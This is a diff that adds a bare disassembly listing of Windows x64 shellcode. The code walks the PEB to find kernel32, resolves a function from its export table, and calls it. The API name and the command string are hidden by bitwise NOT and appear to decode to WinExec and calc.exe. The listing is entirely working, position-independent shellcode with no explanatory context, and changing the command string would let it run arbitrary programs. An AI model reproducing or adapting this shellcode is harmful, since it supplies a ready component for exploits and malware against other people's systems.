@@ -1,0 +1,72 @@
+   0:   48 83 ec 28             sub    $0x28,%rsp
+   4:   48 83 e4 f0             and    $0xfffffffffffffff0,%rsp
+   8:   48 31 c9                xor    %rcx,%rcx
+   b:   65 48 8b 41 60          mov    %gs:0x60(%rcx),%rax
+  10:   48 8b 40 18             mov    0x18(%rax),%rax
+  14:   48 8b 70 10             mov    0x10(%rax),%rsi
+  18:   48 8b 36                mov    (%rsi),%rsi
+  1b:   48 8b 36                mov    (%rsi),%rsi
+  1e:   48 8b 5e 30             mov    0x30(%rsi),%rbx
+  22:   49 89 d8                mov    %rbx,%r8
+  25:   8b 5b 3c                mov    0x3c(%rbx),%ebx
+  28:   4c 01 c3                add    %r8,%rbx
+  2b:   48 31 c9                xor    %rcx,%rcx
+  2e:   66 81 c1 ff 88          add    $0x88ff,%cx
+  33:   48 c1 e9 08             shr    $0x8,%rcx
+  37:   8b 14 0b                mov    (%rbx,%rcx,1),%edx
+  3a:   4c 01 c2                add    %r8,%rdx
+  3d:   44 8b 52 14             mov    0x14(%rdx),%r10d
+  41:   4d 31 db                xor    %r11,%r11
+  44:   44 8b 5a 20             mov    0x20(%rdx),%r11d
+  48:   4d 01 c3                add    %r8,%r11
+  4b:   4c 89 d1                mov    %r10,%rcx
+  4e:   48 b8 a8 96 91 ba 87    movabs $0x6f9c9a87ba9196a8,%rax
+  55:   9a 9c 6f
+  58:   48 f7 d0                not    %rax
+  5b:   48 c1 e0 08             shl    $0x8,%rax
+  5f:   48 c1 e8 08             shr    $0x8,%rax
+  63:   50                      push   %rax
+  64:   48 89 e0                mov    %rsp,%rax
+  67:   48 83 c4 08             add    $0x8,%rsp
+
+000000000000006b <kernel32findfunction>:
+  6b:   67 e3 17                jecxz  85 <FunctionNameNotFound>
+  6e:   31 db                   xor    %ebx,%ebx
+  70:   41 8b 5c 8b 04          mov    0x4(%r11,%rcx,4),%ebx
+  75:   4c 01 c3                add    %r8,%rbx
+  78:   48 ff c9                dec    %rcx
+  7b:   4c 8b 08                mov    (%rax),%r9
+  7e:   4c 39 0b                cmp    %r9,(%rbx)
+  81:   74 03                   je     86 <FunctionNameFound>
+  83:   75 e6                   jne    6b <kernel32findfunction>
+
+0000000000000085 <FunctionNameNotFound>:
+  85:   cc                      int3
+
+0000000000000086 <FunctionNameFound>:
+  86:   51                      push   %rcx
+  87:   41 5f                   pop    %r15
+  89:   4c 89 f9                mov    %r15,%rcx
+  8c:   4d 31 db                xor    %r11,%r11
+  8f:   44 8b 5a 24             mov    0x24(%rdx),%r11d
+  93:   4d 01 c3                add    %r8,%r11
+  96:   48 ff c1                inc    %rcx
+  99:   66 45 8b 2c 4b          mov    (%r11,%rcx,2),%r13w
+  9e:   4d 31 db                xor    %r11,%r11
+  a1:   44 8b 5a 1c             mov    0x1c(%rdx),%r11d
+  a5:   4d 01 c3                add    %r8,%r11
+  a8:   43 8b 44 ab 04          mov    0x4(%r11,%r13,4),%eax
+  ad:   4c 01 c0                add    %r8,%rax
+  b0:   50                      push   %rax
+  b1:   41 5f                   pop    %r15
+  b3:   48 31 c0                xor    %rax,%rax
+  b6:   50                      push   %rax
+  b7:   48 b8 9c 9e 93 9c d1    movabs $0x9a879ad19c939e9c,%rax
+  be:   9a 87 9a
+  c1:   48 f7 d0                not    %rax
+  c4:   50                      push   %rax
+  c5:   48 89 e1                mov    %rsp,%rcx
+  c8:   48 31 d2                xor    %rdx,%rdx
+  cb:   48 ff c2                inc    %rdx
+  ce:   48 83 ec 30             sub    $0x30,%rsp
+  d2:   41 ff d7                call   *%r15
